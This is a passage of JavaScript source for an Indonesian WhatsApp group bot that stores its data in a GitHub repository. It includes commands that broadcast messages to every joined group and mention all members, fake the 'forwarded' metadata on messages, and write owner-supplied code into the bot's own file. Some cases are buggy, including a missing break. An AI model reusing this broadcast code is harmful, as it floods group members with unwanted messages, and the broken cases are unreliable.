 teks += `┏━━━━━━━━━━━━━━━━\n`
 teks += `┃✦ *Nama » ${namaGc}*\n` // <-- UDAH GA UNDEFINED
 teks += `┃✦ *ID » ${gc.id.split('@')[0]}*\n`
 teks += `┃✦ *Member » ${totalMember} orang*\n`
 teks += `┃✦ *Super Admin » ${ownerName}*\n`
 teks += `┃✦ *Ditandai Oleh » @${gc.by}*\n`
 teks += `┗━━━━━━━━━━━━━━━━━━\n\n`
 mentions.push(gc.by + '@s.whatsapp.net')
 }

 teks += `\`[洛] 𝐆𝐈𝐓𝐇𝐔𝐁 𝐃𝐁 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 [洛]\``

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781640228.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 mentionedJid: mentions,
 isForwarded: true,
 forwardingScore: 999999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐆𝐈𝐓𝐇𝐔𝐁 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "𝐑𝐄𝐏𝐎 𝐆𝐈𝐓𝐇𝐔𝐁",
 url: `https://github.com/${GITHUB_OWNER}/${GITHUB_REPO}`
 })
 }]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/sawit.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )

 } catch (e) {
 if (e.response?.status === 404) return payreply('File tandagc.json belum ada 🩸')
 payreply(`Gagal ambil list: ${e.response?.data?.message || 'Error'}`)
 }
}
break

case 'giveakses': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 // FIX: Ambil nomor dari tag, reply, atau ketik manual
 let nomor = m.mentionedJid[0]? m.mentionedJid[0].split('@')[0] :
 m.quoted? m.quoted.sender.split('@')[0] :
 text.replace(/[^0-9]/g, '')

 if (!nomor) return payreply(`Tag/reply nomor yang mau dikasih akses 🩸\nContoh: ${prefix}giveakses @user\nAtau: ${prefix}giveakses 1xxx`)

 // FIX: Validasi nomor internasional, bukan cuma 62
 if (!/^\d{8,15}$/.test(nomor)) return payreply('Nomor ga valid 🩸\nMinimal 8 digit, maksimal 15 digit')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const axios = require('axios')

 payreply('Proses kasih akses...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 let db = { akses: [] }
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 })
 db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status!== 404) throw e
 }

 if (!db.akses) db.akses = []
 if (db.akses.includes(nomor)) return payreply(`Nomor ${nomor} udah punya akses 🩸`)

 db.akses.push(nomor)
 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `giveakses: ${nomor}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`Sukses kasih akses ke @${nomor} 🩸\nTotal akses: ${db.akses.length} orang`, [nomor + '@s.whatsapp.net'])

 } catch (e) {
 payreply(`Gagal kasih akses: ${e.response?.data?.message || 'Error'}`)
 }
}
break



case 'adddb': {
 // Cek akses
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const DB_PATH = `database/database.json`
 const axios = require('axios')

 let isOwner = sender === '62881036109288'
 let isMember = false

 if (!isOwner) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) isMember = true
 } catch (e) {}
 }

 if (!isOwner &&!isMember) return payreply('Lu ga punya akses GH 🩸')

 let nomor = m.mentionedJid[0]? m.mentionedJid[0].split('@')[0] :
 m.quoted? m.quoted.sender.split('@')[0] :
 text.replace(/[^0-9]/g, '')

 if (!nomor) return payreply(`Masukin nomor yang mau ditambah 🩸\nContoh: ${prefix}adddb @user\nAtau: ${prefix}adddb 6399xxx`)
 if (!/^\d{8,15}$/.test(nomor)) return payreply('Nomor ga valid 🩸\nMinimal 8 digit, maksimal 15 digit')

 payreply('Proses nambah database...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${DB_PATH}`
 let db = { Numbers: [] } // <-- FIX: pake Numbers
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 })
 db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status!== 404) throw e
 }

 if (!db.Numbers) db.Numbers = [] // <-- FIX: Numbers
 if (db.Numbers.includes(nomor)) return payreply(`Nomor ${nomor} udah ada di database 🩸`)

 db.Numbers.push(nomor) // <-- FIX: Numbers
 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `adddb: ${nomor}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`Sukses tambah ${nomor} ke database 🩸\nTotal: ${db.Numbers.length} nomor`)

 } catch (e) {
 payreply(`Gagal nambah: ${e.response?.data?.message || 'Error'}`)
 }
}
break


case "kick":
case "kik":
case "dor": {
 if (!m.isGroup) return payreply(mess.group)
 if (!m.quoted && !m.mentionedJid?.length && !text)
 return payreply("Reply / tag orang yang mau dikick")

 let users

 if (m.quoted) {
 users = m.quoted.sender
 } else if (m.mentionedJid.length > 0) {
 users = m.mentionedJid[0]
 } else {
 users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 }

 try {
 await Asepp.groupParticipantsUpdate(
 m.chat,
 [users],
 'remove'
 )

 payreply(`✅ Berhasil mengeluarkan @${users.split('@')[0]}`, {
 mentions: [users]
 })

 } catch (err) {
 console.log(err)
 payreply("❌ Gagal kick user")
 }
}
break



case 'addanggota':
case 'culik': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!m.isGroup) return payreply('Khusus group 🩸')
 if (!isBotAdmins) return payreply('Jadikan bot admin dulu baru bisa nyulik 🩸')

 let nomor = m.mentionedJid[0]? m.mentionedJid[0].split('@')[0] :
 m.quoted? m.quoted.sender.split('@')[0] :
 text.replace(/[^0-9]/g, '')

 if (!nomor) return payreply(`Masukin nomor yang mau diculik 🩸\nContoh: ${prefix}addanggota 628xxx`)
 if (!/^\d{8,15}$/.test(nomor)) return payreply('Nomor ga valid 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const KICK_PATH = `database/kick.json`
 const axios = require('axios')

 payreply('Cek database kick...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${KICK_PATH}`
 let dbKick = {}
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 })
 dbKick = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status === 404) {
 return payreply(`@${nomor} ga ada di daftar kick 🩸\nDatabase kick masih kosong`)
 } else throw e
 }

 // CEK APAKAH DIA KENA KICK DI GROUP INI
 if (!dbKick[m.chat] ||!dbKick[m.chat].includes(nomor)) {
 return payreply(`@${nomor} ga ada di daftar kick group ini 🩸\nCuma yang di-kick admin yang bisa diculik`)
 }

 payreply('Proses nyulik korban kick...')
 const target = nomor + '@s.whatsapp.net'
 const res = await Asepp.groupParticipantsUpdate(m.chat, [target], 'add')

 if (res[0].status === '200') {
 // HAPUS DARI LIST KICK KALO SUKSES
 const index = dbKick[m.chat].indexOf(nomor)
 if (index!== -1) dbKick[m.chat].splice(index, 1)

 const newContent = Buffer.from(JSON.stringify(dbKick, null, 2)).toString('base64')
 await axios.put(getUrl, {
 message: `culik balik: ${nomor}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`Sukses culik @${nomor} balik ke group 🩸`, [target])
 } else if (res[0].status === '409') {
 payreply(`@${nomor} udah balik ke group 🩸`, [target])
 } else if (res[0].status === '403') {
 payreply(`Gagal culik @${nomor} 🩸\nDia nyalain privasi "Hanya kontak"`)
 } else if (res[0].status === '408') {
 payreply(`@${nomor} baru di-kick, tunggu 24 jam baru bisa diculik 🩸`)
 } else {
 payreply(`Gagal culik @${nomor} 🩸\nCode: ${res[0].status}`)
 }

 } catch (e) {
 payreply(`Error: ${e.response?.data?.message || e.message} 🩸`)
 }
}
break

case 'addbl': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!m.isGroup) return payreply('Harus dipake di dalam group yang mau di blacklist 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/bljpm.json`
 const axios = require('axios')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 let dbBl = { groups: [] }
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 })
 dbBl = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status!== 404) throw e
 }

 if (!dbBl.groups) dbBl.groups = []
 if (dbBl.groups.includes(m.chat)) return payreply(`Group ini udah di blacklist JPM 🩸`)

 dbBl.groups.push(m.chat)
 const newContent = Buffer.from(JSON.stringify(dbBl, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `addbl jpm: ${m.chat}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`Sukses blacklist group ini dari JPM 🩸\nTotal group BL: ${dbBl.groups.length}`)
 } catch (e) {
 payreply(`Gagal: ${e.response?.data?.message || e.message} 🩸`)
 }
}
break

case 'delbl': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!m.isGroup) return payreply('Harus dipake di dalam group 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/bljpm.json`
 const axios = require('axios')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 let dbBl = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 const sha = getRes.data.sha

 if (!dbBl.groups ||!dbBl.groups.includes(m.chat)) return payreply('Group ini ga ada di blacklist 🩸')

 dbBl.groups = dbBl.groups.filter(id => id!== m.chat)
 const newContent = Buffer.from(JSON.stringify(dbBl, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `delbl jpm: ${m.chat}`,
 content: newContent,
 sha: sha
 }, {
 })

 payreply(`Sukses hapus group ini dari blacklist JPM 🩸`)
 } catch (e) {
 payreply(`Gagal: ${e.response?.data?.message || e.message} 🩸`)
 }
}
break

case 'listbl': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/bljpm.json`
 const axios = require('axios')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 const dbBl = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 const list = dbBl.groups || []

 if (list.length === 0) return payreply('Belum ada group yang di blacklist JPM 🩸')

 let teks = `*LIST GROUP BLACKLIST JPM* 🩸\n\n`
 for (let i = 0; i < list.length; i++) {
 try {
 let nama = await Asepp.groupMetadata(list[i]).then(res => res.subject)
 teks += `${i+1}. ${nama}\n`
 } catch {
 teks += `${i+1}. ${list[i]}\n`
 }
 }
 teks += `\nTotal: ${list.length} group`

 payreply(teks)
 } catch (e) {
 if (e.response?.status === 404) return payreply('Database blacklist masih kosong 🩸')
 payreply(`Gagal: ${e.response?.data?.message || e.message} 🩸`)
 }
}
break
case 'jpm': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!text &&!m.quoted) return payreply(`Masukin teks atau reply pesan 🩸`)

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const BL_PATH = `database/bljpm.json`
 const axios = require('axios')

 let pesan = m.quoted? m.quoted : { text: text }
 let allGroup = await Asepp.groupFetchAllParticipating()
 let groupIds = Object.keys(allGroup)

 // AMBIL LIST BLACKLIST DARI GH
 let blackList = []
 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
 const getRes = await axios.get(getUrl, {
 })
 const dbBl = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 blackList = dbBl.groups || []
 } catch (e) {
 // Kalo file ga ada, berarti ga ada blacklist
 if (e.response?.status!== 404) console.log('Error ambil bljpm:', e.message)
 }

 // FILTER GROUP YANG GA DI BLACKLIST
 groupIds = groupIds.filter(id =>!blackList.includes(id))

 payreply(`Mengirim JPM ke ${groupIds.length} group...\n${blackList.length} group di-skip karena blacklist 🩸`)

 let sukses = 0
 let gagal = 0

 for (let id of groupIds) {
 try {
 await Asepp.sendMessage(id, { forward: pesan })
 sukses++
 await sleep(2000) // Delay 2 detik biar ga spam
 } catch {
 gagal++
 }
 }

 payreply(`JPM Selesai 🩸\n\nSukses: ${sukses} group\nGagal: ${gagal} group\nSkip BL: ${blackList.length} group`)
}


case 'sendcase': {
 if (!isOwner) return
 if (!global.tmpCase || !global.tmpCase[m.sender]) return // diem kalo gaada

 let cari = global.tmpCase[m.sender]
 const fs = require('fs')
 let filePath = './AseppLohya.js' // SAMAIN SAMA DI ATAS

 try {
 let isiFile = fs.readFileSync(filePath, 'utf8')
 let baris = isiFile.split('\n')

 let regex = new RegExp(`case\\s+['"\`]${cari}['"\`]|case\\s+${cari}:`, 'i')
 let startLine = baris.findIndex(v => regex.test(v))
 if (startLine === -1) return delete global.tmpCase[m.sender]

 let endLine = startLine, bukaKurung = 0
 for (let i = startLine; i < baris.length; i++) {
 let line = baris[i]
 bukaKurung += (line.match(/{/g) || []).length
 bukaKurung -= (line.match(/}/g) || []).length
 if (/^\s*break\s*;?\s*$/.test(line) && bukaKurung <= 0) {
 endLine = i
 break
 }
 }

 let kodeCase = baris.slice(startLine, endLine + 1).join('\n')
 delete global.tmpCase[m.sender] // hapus setelah dikirim

 if (kodeCase.length > 4000) {
 Asepp.sendMessage(m.chat, {
 document: Buffer.from(kodeCase),
 mimetype: 'text/plain',
 fileName: `${cari}.js`
 }, { quoted: m })
 } else {
 payreply(kodeCase)
 }
 } catch (e) {
 delete global.tmpCase[m.sender]
 }
}
break




case 'translate':
case 'tr':
case 'deteksi': {
 if (!m.quoted) {
 return payreply(`╭─「 *AUTO TRANSLATE* 」🩸
│
│ *Cara Pakai:*
│ Reply pesan yg mau di translate
│ Ketik ${prefix + command}
│
│ *Contoh:*
│ Reply teks English → ${prefix + command}
│ Langsung jadi Indonesia 🩸
│
│ *Default:* Auto ke Indonesia
│ *Custom:* ${prefix + command} en
│ *Custom:* ${prefix + command} jp
│ *Custom:* ${prefix + command} ar
│
╰─ Support 100+ bahasa 🩸`)
 }

 let teks = m.quoted.text || m.quoted.caption || m.quoted.description
 if (!teks) return payreply(`╭─「 *ERROR* 」🩸
│
│ Yg di reply ga ada teksnya 🩸
│
╰─ Reply teks/gambar ada caption 🩸`)

 let tujuan = text? text.toLowerCase() : 'id'

 try {
 let res = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
 let json = await res.json()

 let hasil = json[0].map(v => v[0]).join('')
 let dari = json[2]

 // DATABASE 100+ BAHASA
 const langName = {
 'auto': 'Auto Detect', 'af': 'Afrikaans', 'sq': 'Albanian', 'am': 'Amharic', 'ar': 'Arabic',
 'hy': 'Armenian', 'az': 'Azerbaijani', 'eu': 'Basque', 'be': 'Belarusian', 'bn': 'Bengali',
 'bs': 'Bosnian', 'bg': 'Bulgarian', 'ca': 'Catalan', 'ceb': 'Cebuano', 'ny': 'Chichewa',
 'zh-cn': 'Chinese Simplified', 'zh-tw': 'Chinese Traditional', 'co': 'Corsican', 'hr': 'Croatian',
 'cs': 'Czech', 'da': 'Danish', 'nl': 'Dutch', 'en': 'English', 'eo': 'Esperanto', 'et': 'Estonian',
 'tl': 'Filipino', 'fi': 'Finnish', 'fr': 'French', 'fy': 'Frisian', 'gl': 'Galician', 'ka': 'Georgian',
 'de': 'German', 'el': 'Greek', 'gu': 'Gujarati', 'ht': 'Haitian Creole', 'ha': 'Hausa', 'haw': 'Hawaiian',
 'he': 'Hebrew', 'hi': 'Hindi', 'hmn': 'Hmong', 'hu': 'Hungarian', 'is': 'Icelandic', 'ig': 'Igbo',
 'id': 'Indonesian', 'ga': 'Irish', 'it': 'Italian', 'ja': 'Japanese', 'jw': 'Javanese', 'kn': 'Kannada',
 'kk': 'Kazakh', 'km': 'Khmer', 'ko': 'Korean', 'ku': 'Kurdish', 'ky': 'Kyrgyz', 'lo': 'Lao',
 'la': 'Latin', 'lv': 'Latvian', 'lt': 'Lithuanian', 'lb': 'Luxembourgish', 'mk': 'Macedonian',
 'mg': 'Malagasy', 'ms': 'Malay', 'ml': 'Malayalam', 'mt': 'Maltese', 'mi': 'Maori', 'mr': 'Marathi',
 'mn': 'Mongolian', 'my': 'Myanmar', 'ne': 'Nepali', 'no': 'Norwegian', 'ps': 'Pashto', 'fa': 'Persian',
 'pl': 'Polish', 'pt': 'Portuguese', 'pa': 'Punjabi', 'ro': 'Romanian', 'ru': 'Russian', 'sm': 'Samoan',
 'gd': 'Scots Gaelic', 'sr': 'Serbian', 'st': 'Sesotho', 'sn': 'Shona', 'sd': 'Sindhi', 'si': 'Sinhala',
 'sk': 'Slovak', 'sl': 'Slovenian', 'so': 'Somali', 'es': 'Spanish', 'su': 'Sundanese', 'sw': 'Swahili',
 'sv': 'Swedish', 'tg': 'Tajik', 'ta': 'Tamil', 'te': 'Telugu', 'th': 'Thai', 'tr': 'Turkish',
 'uk': 'Ukrainian', 'ur': 'Urdu', 'uz': 'Uzbek', 'vi': 'Vietnamese', 'cy': 'Welsh', 'xh': 'Xhosa',
 'yi': 'Yiddish', 'yo': 'Yoruba', 'zu': 'Zulu'
 }

 let namaAsal = langName || dari.toUpperCase()
 let namaTujuan = langName[tujuan] || tujuan.toUpperCase()

 // Auto flip kalo bahasa sama
 if (dari === tujuan) {
 tujuan = dari === 'en'? 'id' : 'en'
 namaTujuan = langName[tujuan]
 let res2 = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
 let json2 = await res2.json()
 hasil = json2[0].map(v => v[0]).join('')
 }

 // Potong kalo kepanjangan biar ga spam
 let teksAsli = teks.length > 500? teks.slice(0, 500) + '...' : teks
 let teksHasil = hasil.length > 500? hasil.slice(0, 500) + '...' : hasil

 let menu = `╭─「 *AUTO TRANSLATE* 」🩸
│
├─ *Language Info:*
│ • From: ${namaAsal}
│ • To: ${namaTujuan}
│ • Length: ${teks.length} → ${hasil.length}
│
├─ *Original Text:*
│ ${teksAsli}
│
├─ *Translated:*
│ ${teksHasil}
│
├─ *Quick Switch:*
│ • ${prefix + command} en → English
│ • ${prefix + command} jp → Japanese 
│ • ${prefix + command} ar → Arabic
│ • ${prefix + command} ko → Korean
│
╰─ Powered by Google Translate 🩸`

 payreply(menu)

 } catch (e) {
 console.log(e)
 payreply(`╭─「 *ERROR* 」🩸
│
│ Gagal detect bahasa 🩸
│ Error: ${e.message}
│
╰─ Coba lagi nanti 🩸`)
 }
}
break

case 'delcase': {
 if (!isCreator) return payreply(mess.owner)
 const fs = require("fs")

 if (!text) {
 return payreply(`╭─ Del Case
│
├─ Cara Pakai:
│ ${prefix + command} namacase
│
├─ Contoh:
│ ${prefix + command} test
│
╰─ File: AseppLohya.js`)
 }

 const filePath = "./AseppLohya.js"
 let file = fs.readFileSync(filePath, "utf8")
 let lines = file.split("\n")

 let startIndex = -1
 let endIndex = -1

 // Cari case
 for (let i = 0; i < lines.length; i++) {
 if (lines[i].includes(`case "${text}"`) || lines[i].includes(`case '${text}'`)) {
 startIndex = i
 break
 }
 }

 if (startIndex === -1) {
 return payreply(`╭─ Gagal
│
│ Case "${text}" tidak ditemukan
│ Cek nama case
│
╰─ List case? Ketik.listcase`)
 }

 // Cari break
 for (let i = startIndex; i < lines.length; i++) {
 if (lines[i].trim() === "break" || lines[i].includes("break")) {
 endIndex = i
 break
 }
 }

 if (endIndex === -1) {
 return payreply(`╭─ Error
│
│ Break untuk case "${text}" tidak ketemu
│ File berantakan
│
╰─ Edit manual`)
 }

 let totalBaris = endIndex - startIndex + 1
 lines.splice(startIndex, totalBaris)
 fs.writeFileSync(filePath, lines.join("\n"))

 payreply(`╭─ Delcase Berhasil
│
│ Nama Case: ${text}
│ Baris dihapus: ${totalBaris} baris
│ File: ${filePath}
│
├─ Restart bot biar aktif
╰─ Done`)
}
break
case 'addcase': {
  if (!isCreator) return payreply(mess.owner)
  const fs = require("fs")

  if (!text) {
    return payreply(`╭─ Add Case
│
├─ Cara Pakai:
│ ${prefix + command} case "nama": {
│ payreply("halo")
│ }
│ break
│
├─ Contoh:
│ ${prefix + command} case "test": {
│ payreply("ini test")
│ }
│ break
│
╰─ File: AseppLohya.js`)
  }

  const filePath = "./AseppLohya.js"
  let file = fs.readFileSync(filePath, "utf8")

  // Ambil nama case
  let caseName = text.match(/case\s+["'](.+?)["']/)?.[1]
  if (!caseName) {
    return payreply(`╭─ Gagal
│
│ Format case salah
│ Harus ada: case "nama": {
│
╰─ Coba lagi`)
  }

  // Cek duplikat
  if (file.includes(`case "${caseName}"`) || file.includes(`case '${caseName}'`)) {
    return payreply(`╭─ Gagal
│
│ Case "${caseName}" sudah ada
│ Hapus dulu pake delcase1
│
╰─ Coba nama lain`)
  }

  // Cari break terakhir
  let posisi = file.lastIndexOf("break")
  if (posisi === -1) {
    return payreply(`╭─ Error
│
│ Break terakhir tidak ditemukan
│ File AseppLohya.js rusak
│
╰─ Edit manual`)
  }

  let newCase = "\n" + text + "\n"
  let newFile = file.slice(0, posisi) + newCase + file.slice(posisi)
  fs.writeFileSync(filePath, newFile)

  payreply(`╭─ Addcase Berhasil
│
│ Nama Case: ${caseName}
│ File: ${filePath}
│ Status: Sudah ditambah
│
├─ Restart bot biar aktif
╰─ Done`)
}
break


case 'sendmsg': {
 if (!isCreator) return payreply(mess.owner)

 let q = m.quoted? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 let caption = text || q.text || ''

 if (!/image|video|text|sticker|audio/.test(mime) &&!caption) {
 return payreply(`Reply pesan yg mau dikirim\nContoh: reply gambar + ketik.sendmsg`)
 }

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const SENDMSG_PATH = `database/sendmsg.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 const groups = await Asepp.groupFetchAllParticipating()
 const groupList = Object.values(groups)
 if (groupList.length < 1) return payreply('Bot ga join grup manapun')

 let id = Date.now()
 let mediaBase64 = null

 if (/image|video|sticker|audio/.test(mime)) {
 let media = await q.download()
 mediaBase64 = media.toString('base64')
 }

 let sendmsgDb = { list: [] }
 let sha = null
 try {
 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${SENDMSG_PATH}`
 const res = await axios.get(url, {
 })
 sendmsgDb = JSON.parse(Buffer.from(res.data.content, 'base64').toString())
 sha = res.data.sha
 } catch (e) {
 if (e.response?.status!== 404) return payreply('Gagal konek GitHub')
 }

 sendmsgDb.list = sendmsgDb.list.filter(v => Date.now() - v.id < 60000)
 sendmsgDb.list.push({
 id: id,
 sender: m.sender,
 mime: mime,
 caption: caption,
 media: mediaBase64
 })

 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${SENDMSG_PATH}`
 await axios.put(url, {
 message: `Add sendmsg ${id}`,
 content: Buffer.from(JSON.stringify(sendmsgDb, null, 2)).toString('base64'),
 sha: sha
 }, {
 })

 let rows = groupList.map((v) => ({
 title: v.subject.length > 35? v.subject.slice(0, 35) + '...' : v.subject,
 description: `${v.participants.length} Member`,
 id: `.sendmsgconfirm ${id}_${v.id}`
 }))

 let teks = `\`𝗦𝗘𝗡𝗗𝗠𝗦𝗚 𝗚𝗜𝗧𝗛𝗨𝗕\`\n\nHi \`${pushname}\` 👋 Pilih grup tujuan. Data disimpan di GitHub. 🩸\n\n⌲ \`𝐈𝐍𝐅𝐎\`\n┏━━━━━━━━━━━━━━━━\n┃✦ *Total Grup » ${groupList.length}*\n┃✦ *Type » ${/image/.test(mime)? 'Image' : /video/.test(mime)? 'Video' : /sticker/.test(mime)? 'Sticker' : /audio/.test(mime)? 'Audio' : 'Text'}*\n┃✦ *Storage » GitHub DB*\n┗━━━━━━━━━━━━━━━━━━`

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: "" }),
 footer: proto.Message.InteractiveMessage.Footer.create({ text: teks }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (await prepareWAMessageMedia({ video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781640228.mp4" } }, { upload: Asepp.waUploadToServer })).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 mentionedJid: ['62881036109288@s.whatsapp.net'],
 isForwarded: true,
 forwardingScore: 999999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "PILIH GRUP",
 sections: [{
 title: "List Grup Bot",
 highlight_label: "TOTAL " + groupList.length,
 rows: rows.slice(0, 25)
 }]
 })
 }]
 })
 })
 }
 }
 }, { quoted: m })

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break


case 'sendmsgconfirm': {
 if (!isCreator) return
 if (!text.includes('_')) return

 let [id, gcId] = text.split('_')
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const SENDMSG_PATH = `database/sendmsg.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 let sendmsgDb = { list: [] }
 let sha = null
 try {
 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${SENDMSG_PATH}`
 const res = await axios.get(url, {
 })
 sendmsgDb = JSON.parse(Buffer.from(res.data.content, 'base64').toString())
 sha = res.data.sha
 } catch (e) {
 return payreply('Gagal ambil data GitHub')
 }

 let data = sendmsgDb.list.find(v => v.id == id)
 if (!data) return payreply('Sesi expired, ulangi.sendmsg')
 if (data.sender!== m.sender) return
 if (Date.now() - data.id > 60000) return payreply('Sesi expired, ulangi.sendmsg')

 let metadata = await Asepp.groupMetadata(gcId)
 let participants = metadata.participants.map(v => v.id)

 try {
 if (/image/.test(data.mime)) {
 let media = Buffer.from(data.media, 'base64')
 await Asepp.sendMessage(gcId, { image: media, caption: data.caption, mentions: participants })
 } else if (/video/.test(data.mime)) {
 let media = Buffer.from(data.media, 'base64')
 await Asepp.sendMessage(gcId, { video: media, caption: data.caption, gifPlayback: /gif/.test(data.mime), mentions: participants })
 } else if (/sticker/.test(data.mime)) {
 let media = Buffer.from(data.media, 'base64')
 await Asepp.sendMessage(gcId, { sticker: media, mentions: participants })
 if (data.caption) await Asepp.sendMessage(gcId, { text: data.caption, mentions: participants })
 } else if (/audio/.test(data.mime)) {
 let media = Buffer.from(data.media, 'base64')
 await Asepp.sendMessage(gcId, { audio: media, mimetype: 'audio/mp4', ptt: false, mentions: participants })
 if (data.caption) await Asepp.sendMessage(gcId, { text: data.caption, mentions: participants })
 } else {
 await Asepp.sendMessage(gcId, { text: data.caption, mentions: participants })
 }

 sendmsgDb.list = sendmsgDb.list.filter(v => v.id!= id)
 const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${SENDMSG_PATH}`
 await axios.put(url, {
